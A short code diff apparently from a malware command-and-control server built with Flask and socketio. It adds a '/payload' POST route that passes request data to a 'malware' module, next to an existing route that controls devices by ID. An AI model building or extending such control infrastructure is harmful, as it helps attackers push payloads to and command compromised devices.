@@ -62,6 +62,12 @@ def ctrl():
     malware.ctrl(data['device_id'])
     return ""
 
+@app.route('/payload', methods=['POST'])
+def payload():
+    data = request.get_json()
+    malware.payload(data)
+    return ""
+
 if __name__ == "__main__":
     flaskApp = socketio.Middleware(sio, app)
     eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), flaskApp)
